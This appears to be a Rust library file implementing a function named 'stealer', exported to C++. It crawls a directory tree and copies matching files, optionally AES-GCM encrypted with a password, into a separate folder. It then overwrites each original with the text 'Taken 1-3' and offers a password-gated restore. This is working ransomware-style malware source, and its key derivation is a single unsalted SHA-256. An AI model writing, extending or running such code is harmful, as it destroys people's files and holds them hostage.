use std::ffi::CStr;
use std::fs;
use std::io::{self, BufRead, Read};
use std::os::raw::c_char;
use std::path::{Path, PathBuf};

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    aead::rand_core::RngCore,
    Aes256Gcm, Key, Nonce,
};
use sha2::{Digest, Sha256};

pub fn get_home_dir() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

pub fn derive_key(password: &str) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(password.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

pub fn encrypt_data(data: &[u8], password: &str) -> Result<Vec<u8>, String> {
    let key_bytes = derive_key(password);
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);

    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, data)
        .map_err(|e| format!("Encryption error: {}", e))?;

    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    Ok(result)
}

pub fn decrypt_data(data: &[u8], password: &str) -> Result<Vec<u8>, String> {
    if data.len() < 12 {
        return Err("Encrypted data is too short or corrupted.".into());
    }

    let (nonce_bytes, ciphertext) = data.split_at(12);
    let key_bytes = derive_key(password);
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| format!("Decryption error (wrong password?): {}", e))
}

pub fn crawl(path: &Path, files: &mut Vec<PathBuf>, ignore_list: &[String]) -> io::Result<()> {
    for item in fs::read_dir(path)? {
        let item = item?;
        let item_path = item.path();

        if let Some(name_os) = item_path.file_name() {
            let name = name_os.to_string_lossy();
            if ignore_list.iter().any(|ignore| ignore == &name) {
                continue;
            }
        }

        if item_path.is_dir() {
            crawl(&item_path, files, ignore_list)?;
        } else {
            files.push(item_path);
        }
    }
    Ok(())
}

pub fn stealer(
    list: &[PathBuf],
    folder: &Path,
    replace: &str,
    prefix: Option<&str>,
    suffix: Option<&str>, // Can now be e.g. ".txt|.docx|.pdf"
    password: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    fs::create_dir_all(folder)?;

    for file in list {
        let file_name = match file.file_name() {
            Some(n) => n.to_string_lossy(),
            None => continue,
        };

        let mut matches = true;

        if let Some(pre) = prefix {
            if !file_name.starts_with(pre) {
                matches = false;
            }
        }

        // Updated suffix logic to support multiple values separated by '|'
        if let Some(suf) = suffix {
            let allowed_suffixes: Vec<&str> = suf.split('|').collect();
            let mut suffix_matched = false;
            for s in allowed_suffixes {
                if file_name.ends_with(s.trim()) {
                    suffix_matched = true;
                    break;
                }
            }
            if !suffix_matched {
                matches = false;
            }
        }

        if matches {
            // ... (rest of your backup/encryption logic) ...
            let file_str = file.to_string_lossy();
            let existing_bytes = fs::read(file)?;

            let safe_backup_name = file_str.replace(['/', '\\'], "_");
            let destination = folder.join(safe_backup_name);

            let mut backup_content = file_str.as_bytes().to_vec();
            backup_content.push(b'\n');
            backup_content.extend(&existing_bytes);

            let final_backup_data = match password {
                Some(pwd) => encrypt_data(&backup_content, pwd)?,
                None => backup_content,
            };

            fs::write(&destination, final_backup_data)?;
            fs::write(file, replace)?;
        }
    }
    Ok(())
}

pub fn restoration(
    backup_folder: &Path,
    password: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    if !backup_folder.exists() {
        return Ok(());
    }

    for item in fs::read_dir(backup_folder)? {
        let item = item?;
        let backup_file_path = item.path();

        if backup_file_path.is_file() {
            let encrypted_data = fs::read(&backup_file_path)?;

            let decrypted_data = match password {
                Some(pwd) => decrypt_data(&encrypted_data, pwd)?,
                None => encrypted_data,
            };

            let mut reader = io::BufReader::new(&decrypted_data[..]);
            let mut original_path_str = String::new();
            reader.read_line(&mut original_path_str)?;

            let original_path_str = original_path_str.trim_end_matches(['\r', '\n']);

            if !original_path_str.is_empty() {
                let mut remaining_bytes = Vec::new();
                reader.read_to_end(&mut remaining_bytes)?;

                let original_path = Path::new(original_path_str);
                if let Some(parent) = original_path.parent() {
                    fs::create_dir_all(parent)?;
                }

                fs::write(original_path, remaining_bytes)?;
            }
        }
    }
    Ok(())
}

// --- FFI EXPORTS FOR C++ ---

#[unsafe(no_mangle)]
pub extern "C" fn run_stealer_ffi(
    target_path_ptr: *const c_char,
    backup_folder_ptr: *const c_char,
    suffix_ptr: *const c_char,
    password_ptr: *const c_char,
) -> bool {
    let target_path_str = match unsafe { CStr::from_ptr(target_path_ptr).to_str() } {
        Ok(s) => s,
        Err(_) => return false,
    };
    let backup_folder_str = match unsafe { CStr::from_ptr(backup_folder_ptr).to_str() } {
        Ok(s) => s,
        Err(_) => return false,
    };

    let suffix = if suffix_ptr.is_null() {
        None
    } else {
        unsafe { CStr::from_ptr(suffix_ptr).to_str().ok() }
    };

    let password = if password_ptr.is_null() {
        None
    } else {
        unsafe { CStr::from_ptr(password_ptr).to_str().ok() }
    };

    let target_path = Path::new(target_path_str);
    let backup_folder = Path::new(backup_folder_str);
    let replace_text = "Taken 1-3\n";
    let ignore_list = vec!["target".to_string(), ".git".to_string()];

    let mut files = Vec::new();
    if crawl(target_path, &mut files, &ignore_list).is_err() {
        return false;
    }

    if stealer(&files, backup_folder, replace_text, None, suffix, password).is_err() {
        return false;
    }

    true
}

#[unsafe(no_mangle)]
pub extern "C" fn run_restoration_ffi(
    backup_folder_ptr: *const c_char,
    password_ptr: *const c_char,
) -> bool {
    let backup_folder_str = match unsafe { CStr::from_ptr(backup_folder_ptr).to_str() } {
        Ok(s) => s,
        Err(_) => return false,
    };

    let password = if password_ptr.is_null() {
        None
    } else {
        unsafe { CStr::from_ptr(password_ptr).to_str().ok() }
    };

    let backup_folder = Path::new(backup_folder_str);

    restoration(backup_folder, password).is_err() == false
}
